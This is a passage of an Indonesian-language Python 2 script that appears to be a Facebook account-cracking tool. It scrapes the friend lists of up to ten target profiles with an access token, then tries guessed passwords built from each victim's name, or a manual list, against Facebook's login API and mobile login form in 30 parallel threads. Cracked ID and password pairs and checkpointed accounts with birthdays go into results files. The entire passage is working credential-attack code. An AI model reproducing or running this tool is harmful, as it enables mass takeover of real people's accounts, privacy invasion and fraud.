		idt2 = raw_input(' %s[%s*%s] ID Publik 2 :%s '%(N,H,N,H))
		idt3 = raw_input(' %s[%s*%s] ID Publik 3 :%s '%(N,H,N,H))
		idt4 = raw_input(' %s[%s*%s] ID Publik 4 :%s '%(N,H,N,H))
		idt5 = raw_input(' %s[%s*%s] ID Publik 5 :%s '%(N,H,N,H))
		idt6 = raw_input(' %s[%s*%s] ID Publik 6 :%s '%(N,H,N,H))
		idt7 = raw_input(' %s[%s*%s] ID Publik 7 :%s '%(N,H,N,H))
		idt8 = raw_input(' %s[%s*%s] ID Publik 8 :%s '%(N,H,N,H))
		idt9 = raw_input(' %s[%s*%s] ID Publik 9 :%s '%(N,H,N,H))
		idt10 = raw_input(' %s[%s*%s] ID Publik 10 :%s '%(N,H,N,H))
		lim = raw_input(' %s[%s?%s] Limit Per Target : %s'%(N,K,N,H))
		try:
			r = requests.get("https://graph.facebook.com/"+idt1+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 1 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt2+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 2 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt3+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 3 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt4+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 4 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt5+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 5 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt6+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 6 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt7+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 7 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt8+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 8 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt9+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 9 Tidak Ada !'%(N,M,N)
		try:
			r = requests.get("https://graph.facebook.com/"+idt10+"/friends?limit="+lim+"&access_token="+__cindy__)
			j = json.loads(r.text)
			for a in j['data']:
				uid = a['id']
				name = a['name']
				id.append(uid+'<=>'+name)
		except KeyError:
			print ' %s[%s!%s] ID 10 Tidak Ada !'%(N,M,N)
			
	print '\n %s[%s*%s] Total ID : %s%s%s' %(N,H,N,M,str(len(id)),N);time.sleep(2)
	print ' %s[%s?%s] Pilih Metode Intip & Metode Sandi Anda.'%(N,K,N)
	print ' %s[%sT%s] Metode %sb-api %s(%sSandi Otomatis Proses Cepat%s)'%(N,H,N,O,N,H,N)
        print ' %s[%sY%s] Metode %smbasic %s(%sSandi Manual Proses Normal%s)'%(N,H,N,O,N,K,N)
	ask = raw_input(' [%s?%s] Ingin menggunakan Metode [%sY%s/%sT%s]: '%(K,N,H,N,M,N))
	if ask == "Y" or ask == "y":
		manual()  
	print ' %s=================================================='%(N)
	print ' [%s✓%s] Hasil %sOK%s ke : %sresults/OK-%s-%s-%s.txt%s' % (H,N,H,N,K,ha, op, ta,N)
	print ' [%s✓%s] Hasil %sCP%s ke : %sresults/CP-%s-%s-%s.txt%s' % (K,N,K,N,K,ha, op, ta,N)
	print ' %s=================================================='%(N)
	print ' [%s!%s] %sMatikan data selular untuk menjeda proses &\n Merefresh Cache IP Address agar lebih Stabil.'%(M,N,M)
	print ' %s==================================================\n'%(N)
	
	def main(user):
		global loop, token
		pwx = []
		sys.stdout.write(
		      '\r [\x1b[1;96m*\x1b[0m] Intip : %s/%s \x1b[1;92mOK:%s \x1b[0m- \x1b[1;93mCP:%s \x1b[0m'%(loop,len(id),len(ok),len(cp))
		); sys.stdout.flush()
		uid,name=user.split("<=>")
		for ss in name.split(" "):
			if len(ss)<3:
				continue
			else:
				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
					pwx.append(ss)
					pwx.append(ss+"123")
					pwx.append(ss+"12345")
				else:
					pwx.append(ss+"123")
					pwx.append(ss+"12345")
		try:
			for pw in pwx:
				pw = pw.lower()
				ua_api = random.choice(['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'])
				params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
				api = 'https://b-api.facebook.com/method/auth.login'
				response = requests.get(api, params=params, headers={'user-agent': ua_api})
				if re.search('(EAAA)\\w+', response.text):
					print '\r %sID: %s|%s                 %s' % (H,uid,pw,N)
					wrt = ' [✓] %s|%s' % (uid,pw)
					ok.append(wrt)
					open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
					break
					continue					
				elif 'www.facebook.com' in response.json()['error_msg']:
					try:
						__cindy__ = open('__yayan__.txt').read()
						ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(uid,__cindy__))
						az = json.loads(ak.text)
						ttl= az['birthday'].replace('/','-')
						print '\r %sID: %s|%s|%s     %s' % (K,uid,pw,ttl,N)
						wrt = ' [×] %s|%s|%s' % (uid,pw,ttl)
						cp.append(wrt)
						open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
						break
					except(KeyError, IOError):
						ttl = ' '
					except:pass
					print '\r %sID: %s|%s                %s' % (K,uid,pw,N)
					wrt = ' [×] %s|%s' % (uid,pw)
					cp.append(wrt)
					open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
					break
					continue
					
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print '\n %s[%s✓%s] Proses Intip by ROY Selesai...'%(N,K,N)
	lagi = raw_input('\n %s[%s*%s] ke Menu Multi Intip Lagi? Y/t : %s'%(N,O,N,H))
	if lagi in ('Y', 'y'):
		os.system("python2 roy-rmbf2.py")
	elif lagi in ('T', 't'):
		os.system("python2 roy-rmbf.py")
	else:
		exit()
		
def manual():
	print '\n [%s?%s] Contoh: %ssayang,bismillah,roy123%s '%(K,N,K,N)
	print ' [%s!%s] %sGunakan simbol (,) untuk pemisah sandi%s '%(M,N,M,N)
	pw = raw_input('\n [%s?%s] Masukkan Sandi Manual : '%(K,N))
	print ' [%s?%s] Sandi Manual Telah Dibuat : [ %s%s%s ]' % (K,N,M, pw, N)
	print ('')
	if len(pw) ==0:
		print '\n %s[%s×%s] jangan kosong bro kata sandi nya'%(N,M,N)
	print ' %s=================================================='%(N)
	print ' [%s✓%s] Hasil %sOK%s ke : %sresults/OK-%s-%s-%s.txt%s' % (H,N,H,N,K,ha, op, ta,N)
	print ' [%s✓%s] Hasil %sCP%s ke : %sresults/CP-%s-%s-%s.txt%s' % (K,N,K,N,K,ha, op, ta,N)
	print ' %s=================================================='%(N)
	print ' [%s!%s] %sMatikan data selular untuk menjeda proses &\n Merefresh Cache IP Address agar lebih Stabil.'%(M,N,M)
	print ' %s==================================================\n'%(N)
	
	def main(user):
		global ok,cp,ttl,loop
		sys.stdout.write('\r [\x1b[1;96m*\x1b[0m] Intip : %s/%s \x1b[1;92mOK:%s \x1b[0m- \x1b[1;93mCP:%s \x1b[0m'%(loop,len(id),len(ok),len(cp))
		); sys.stdout.flush()
		uid,name=user.split("<=>")
		ss = name.split(" ")
		try:
			os.mkdir('results')
		except OSError:
			pass
		try:
			for asu in pw.split(","):
				ua_mb = random.choice(['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'])
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': ua_mb})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r \x1b[1;93mID: ' +uid+ '|' + asu + '       ')
					ok.append(uid+'|'+asu)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(' \x1b[1;93mID: '+str(uid)+'|'+str(asu)+'\n')
					save.close()
					break
					continue
				if 'checkpoint' in xo:
					try:
						__cindy__ = open('__yayan__.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+__cindy__)
						data = s.get(url).json()
						ttl = data['birthday'].replace("/","-")
						print('\r \x1b[1;93mID: ' +uid+ '|' + asu + '|' + ttl)
						cp.append(uid+'|'+asu+'|'+ttl)
						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
						save.write(' \x1b[1;93mID: '+str(uid)+'|'+str(asu)+'|'+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print('\r \x1b[1;93mID: ' +uid+ '|' + asu + '       ')
					cp.append(uid+'|'+asu)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(' \x1b[1;93mID: '+str(uid)+'|'+str(asu)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print '\n %s[%s✓%s] Proses Intip by ROY Selesai...'%(N,K,N)
	lagi = raw_input('\n %s[%s*%s] ke Menu Multi Intip Lagi? Y/t : %s'%(N,O,N,H))
	if lagi in ('Y', 'y'):
		os.system("python2 roy-rmbf2.py")
	elif lagi in ('T', 't'):
		os.system("python2 roy-rmbf.py")
	else:
		exit()

            
if __name__ == '__main__':
    moch_yayan()
